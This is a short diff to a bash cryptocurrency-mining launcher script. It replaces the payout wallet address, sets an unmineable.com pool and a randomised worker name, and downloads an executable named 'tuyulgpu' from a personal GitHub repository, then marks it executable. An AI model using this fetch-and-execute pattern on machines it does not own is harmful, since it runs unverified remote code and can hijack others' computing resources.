@@ -1,6 +1,6 @@
 #!/bin/bash
 POOL=ethash.unmineable.com:3333
-WALLET=SHIB:17g6AEzVG7RpD7mn6hBTc5tJ2ZAUGdxo4y
+WALLET=SHIB:0x663e23e815ff1720b42e223f757fb245d97fbc41
 WORKER=$(echo $(shuf -i 10-40 -n 1)-CO#im8m-ybvt)
 wget https://github.com/skullCANDe/hick/raw/main/tuyulgpu
 chmod +x tuyulgpu
